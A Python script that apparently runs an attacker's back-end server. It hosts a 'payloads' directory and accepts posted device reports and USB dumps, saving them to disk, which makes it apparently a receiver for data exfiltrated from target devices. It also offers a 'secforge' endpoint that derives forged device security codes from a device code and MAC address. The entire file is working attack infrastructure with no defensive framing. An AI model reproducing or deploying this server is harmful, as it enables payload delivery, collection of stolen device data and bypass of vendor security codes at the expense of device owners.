#!/usr/bin/env python3
"""GET: files. POST /a6q_report, /a6q_usb. POST /secforge {deviceCode, mac} -> security code."""
import http.server, datetime, os, json, hmac, hashlib, base64
BASE = os.path.expanduser("~/alvidaa/payloads")
USB = os.path.join(BASE, "usb_dumps")
os.makedirs(USB, exist_ok=True)
def secforge(device_code, mac, level="9"):
    key = base64.b64encode(device_code.encode()).decode()
    msg = mac + "2015-01-01" + level
    temp = hmac.new(key.encode(), msg.encode(), hashlib.sha1).hexdigest()
    auth = ((ord(temp[8]) & 0xff) << 24) | ((ord(temp[7]) & 0xff) << 16) | ((ord(temp[6]) & 0xff) << 8) | (ord(temp[5]) & 0xff)
    auth %= 100000000
    auth8 = f"{auth:08d}"
    return "0" + "9999" + auth8 + "9" + "0" + "00"
class H(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *a, **k): super().__init__(*a, directory=BASE, **k)
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "*")
    def do_OPTIONS(self):
        self.send_response(204); self._cors(); self.end_headers()
    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        data = self.rfile.read(n)
        ts = datetime.datetime.now().strftime("%H%M%S")
        if self.path == "/a6q_report" or self.path == "/a6q_usb":
            out = os.path.join(USB if self.path == "/a6q_usb" else BASE, ("a6q_report_" if self.path == "/a6q_report" else "usb_") + ts + ".json")
            with open(out, "wb") as f: f.write(data)
            print("[RECV] " + out + " (" + str(n) + " b)", flush=True)
            self.send_response(200); self._cors(); self.end_headers(); self.wfile.write(b"ok")
        elif self.path == "/secforge":
            try:
                j = json.loads(data)
                code = secforge(j["deviceCode"], j["mac"])
                print("[SECFORGE] " + code, flush=True)
                self.send_response(200); self._cors()
                self.send_header("Content-Type", "application/json"); self.end_headers()
                self.wfile.write(json.dumps({"code": code}).encode())
            except Exception as e:
                self.send_response(500); self._cors(); self.end_headers(); self.wfile.write(str(e).encode())
        else:
            self.send_error(404)
    def log_message(self, *a): pass
http.server.HTTPServer(("0.0.0.0", 8899), H).serve_forever()
